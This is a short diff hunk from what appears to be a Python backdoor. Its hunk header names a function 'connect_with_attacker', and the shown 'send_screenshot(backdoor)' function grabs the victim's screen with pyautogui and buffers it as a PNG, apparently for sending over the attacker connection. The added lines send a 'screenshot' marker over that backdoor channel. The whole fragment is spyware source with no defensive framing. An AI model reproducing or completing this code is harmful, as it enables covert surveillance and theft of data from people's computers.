@@ -31,6 +31,8 @@ def connect_with_attacker():
 
 
 def send_screenshot(backdoor):
+    backdoor.send("screenshot".encode("utf-8"))
+
     screenshot = pyautogui.screenshot()
     buffered = BytesIO()
     screenshot.save(buffered, format="PNG")
